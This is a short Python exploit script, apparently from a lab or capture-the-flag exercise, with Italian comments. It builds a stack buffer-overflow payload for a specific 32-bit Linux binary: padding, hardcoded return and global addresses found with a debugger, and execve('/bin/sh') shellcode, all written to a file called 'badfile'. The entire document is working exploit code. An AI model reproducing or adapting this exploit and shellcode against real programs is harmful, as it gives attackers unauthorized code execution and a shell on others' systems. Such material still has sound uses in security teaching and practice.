import os
import struct

shellcode = (b"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")

vuln = 0x804846b

string = 0x0804a060 #indirizzo di string trovato con info variables su peda

#payload per superare la prima gets:
payload = "A\n" #non serve che abbia una qualche lunghezza

#payload1 per la seconda gets che pero` si somma all'altro
payload1 = "a"*148 #base per arrivare a *buf --> sono "a" per matchare la condizione dentro vuln
payload1 += struct.pack("I", string) #metto dentro a buf l'indirizzo della funz globale string
payload1 += "C"*8
payload1 += struct.pack("I", vuln)
payload1 += "D"*4

padding = 0x0804a060 + len(payload1) + 4

payload1 += struct.pack("I", padding)
payload1 += shellcode

payload += payload1

f = open("badfile", "w")
f.write("%s" % payload)
f.close()

